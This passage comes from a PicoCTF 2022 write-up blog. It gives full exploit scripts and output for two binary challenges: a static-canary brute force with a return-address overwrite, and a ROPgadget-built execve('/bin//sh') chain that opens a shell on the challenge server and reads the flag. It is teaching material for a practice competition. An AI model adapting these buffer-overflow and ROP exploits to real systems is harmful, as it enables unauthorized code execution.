<span class="c1">## Configuration
</span><span class="n">canary_offset</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">binary</span> <span class="o">=</span> <span class="s">'/home/h3x/work/ctf/picoctf/bof3/vuln'</span>
<span class="n">eip_offset</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">targetAddr</span> <span class="o">=</span> <span class="mh">0x08049336</span>
<span class="n">promptChar</span> <span class="o">=</span> <span class="s">'&gt;'</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Exploit Started'</span><span class="p">)</span>

<span class="c1">## Find canary value
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] Bruteforcing Canary...'</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">bfcanary</span><span class="p">(</span><span class="n">canary_offset</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'  [*] Canary value found: {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">canary</span><span class="p">))</span>

<span class="c1">## Setup and start process
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>
<span class="n">proc</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span><span class="mi">58840</span><span class="p">)</span>

<span class="c1">## Exploit
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] EIP offset is set at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>

<span class="c1"># payload
</span><span class="n">chain</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">canary_offset</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'B'</span> <span class="o">*</span> <span class="n">eip_offset</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">targetAddr</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>

<span class="c1"># run the exploit
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] Sending payload'</span><span class="p">)</span>
<span class="c1">#proc.recvuntil(promptChar).decode()
</span><span class="n">proc</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">promptChar</span><span class="p">,</span><span class="s">'200'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">promptChar</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'  [*] Printing program output'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">readall</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">,</span><span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">))</span>
</pre></table></code></div></div><p>Output:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python solve.py
Exploit Started
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing Canary...
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Canary value found: BiRd
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> EIP offset is <span class="nb">set </span>at 16
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending payload
  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Printing program output
 Ok... Now Where<span class="s1">'s the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}
</span></pre></table></code></div></div><h1 id="ropfu">ropfu</h1><h2 id="challenge-4">Challenge<a href="#challenge-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>What's ROP

Hint: A classic ROP to get a shell
</pre></table></code></div></div><h2 id="solution-4">Solution<a href="#solution-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>To get this flag, I had to do a ROP exploit to launch a shell via syscall.</p><p>I spent a loooot of time trying to build a payload by myself by checking gadgets one by one. I finally figured that ROPgadget (which I was using to the thing by hands) can give away the solution :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> vuln <span class="nt">--rop</span> <span class="nt">--badbytes</span> <span class="s2">"0a"</span>
<span class="o">[</span>...]
<span class="c"># execve generated by ROPgadget</span>

from struct import pack

<span class="c"># Padding goes here</span>
p <span class="o">=</span> <span class="s1">''</span>

p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080583c9<span class="o">)</span> <span class="c"># pop edx ; pop ebx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5060<span class="o">)</span> <span class="c"># @ .data</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x41414141<span class="o">)</span> <span class="c"># padding</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080b074a<span class="o">)</span> <span class="c"># pop eax ; ret</span>
p +<span class="o">=</span> <span class="s1">'/bin'</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x08059102<span class="o">)</span> <span class="c"># mov dword ptr [edx], eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080583c9<span class="o">)</span> <span class="c"># pop edx ; pop ebx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5064<span class="o">)</span> <span class="c"># @ .data + 4</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x41414141<span class="o">)</span> <span class="c"># padding</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080b074a<span class="o">)</span> <span class="c"># pop eax ; ret</span>
p +<span class="o">=</span> <span class="s1">'//sh'</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x08059102<span class="o">)</span> <span class="c"># mov dword ptr [edx], eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080583c9<span class="o">)</span> <span class="c"># pop edx ; pop ebx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5068<span class="o">)</span> <span class="c"># @ .data + 8</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x41414141<span class="o">)</span> <span class="c"># padding</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0804fb90<span class="o">)</span> <span class="c"># xor eax, eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x08059102<span class="o">)</span> <span class="c"># mov dword ptr [edx], eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x08049022<span class="o">)</span> <span class="c"># pop ebx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5060<span class="o">)</span> <span class="c"># @ .data</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x08049e39<span class="o">)</span> <span class="c"># pop ecx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5068<span class="o">)</span> <span class="c"># @ .data + 8</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080583c9<span class="o">)</span> <span class="c"># pop edx ; pop ebx ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5068<span class="o">)</span> <span class="c"># @ .data + 8</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x080e5060<span class="o">)</span> <span class="c"># padding without overwrite ebx</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0804fb90<span class="o">)</span> <span class="c"># xor eax, eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0808055e<span class="o">)</span> <span class="c"># inc eax ; ret</span>
p +<span class="o">=</span> pack<span class="o">(</span><span class="s1">'&lt;I'</span>, 0x0804a3d2<span class="o">)</span> <span class="c"># int 0x80</span>
</pre></table></code></div></div><p>I just had to use the output from ROPgadget to complete the exploit script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# execve generated by ROPgadget
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Padding goes here
</span><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">28</span>

<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># @ .data
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b074a</span><span class="p">)</span> <span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'/bin'</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5064</span><span class="p">)</span> <span class="c1"># @ .data + 4
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080b074a</span><span class="p">)</span> <span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'//sh'</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0804fb90</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049022</span><span class="p">)</span> <span class="c1"># pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># @ .data
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08049e39</span><span class="p">)</span> <span class="c1"># pop ecx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># padding without overwrite ebx
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0804fb90</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0804a3d2</span><span class="p">)</span> <span class="c1"># int 0x80
</span><span class="n">proc</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span><span class="mi">57096</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>Output:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python exploit.py                              
<span class="o">[</span>+] Opening connection to saturn.picoctf.net on port 57096: Done
  proc.recvuntil<span class="o">(</span><span class="s1">'!\n'</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt
vuln
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
picoCTF<span class="o">{</span>5n47ch_7h3_5h311_029ab653<span class="o">}</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/picoctf/'>picoctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/gdb/" class="post-tag no-text-decoration" >gdb</a> <a href="/tags/radare2/" class="post-tag no-text-decoration" >radare2</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PicoCTF 2022 - Binary Exploitation - h3xit's ~&url=https://h3xitsec.github.io/posts/picoctf-binary/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PicoCTF 2022 - Binary Exploitation - h3xit's ~&u=https://h3xitsec.github.io/posts/picoctf-binary/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=PicoCTF 2022 - Binary Exploitation - h3xit's ~&url=https://h3xitsec.github.io/posts/picoctf-binary/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/picoctf-binary/">PicoCTF 2022 - Binary Exploitation</a><li><a href="/posts/picoctf-reverse/">PicoCTF 2022 - Reverse Engineering Challenges</a><li><a href="/posts/picoctf-crypto/">PicoCTF 2022 - Crypto Challenges</a><li><a href="/posts/htb-routerspace/">Hack The Box - RouterSpace</a><li><a href="/posts/polyctf-crypto/">24H@CTF - Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/picoctf-reverse/"><div class="card-body"> <em class="timeago small" date="2022-03-29 00:00:00 -0400" >Mar 29</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PicoCTF 2022 - Reverse Engineering Challenges</h3><div class="text-muted small"><p> Bloat.py Challenge Can you get the flag? Run this Python program in the same directory as this encrypted flag. We are given 2 files: bloat.flag.py : a script that asks for a password and gives ...</p></div></div></a></div><div class="card"> <a href="/posts/picoctf-crypto/"><div class="card-body"> <em class="timeago small" date="2022-03-29 00:00:00 -0400" >Mar 29</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PicoCTF 2022 - Crypto Challenges</h3><div class="text-muted small"><p> Basic Mod 1 Challenge We found this weird message being passed around on the servers, we think we have a working decrpytion scheme. Download the message here. Take each number mod 37 and map it to ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-routerspace/"><div class="card-body"> <em class="timeago small" date="2022-03-08 00:00:00 -0500" >Mar 8</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - RouterSpace</h3><div class="text-muted small"><p> Challenge description https://app.hackthebox.com/machines/RouterSpace This VM is a medium Linux machine Reconnaissance / Enumeration Port scanning and service identification $ rustscan -a $ip ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/picoctf-reverse/" class="btn btn-outline-primary" prompt="Older"><p>PicoCTF 2022 - Reverse Engineering Challenges</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> Â© 2022 <a href="https://github.com/h3xitsec">h3xit</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script 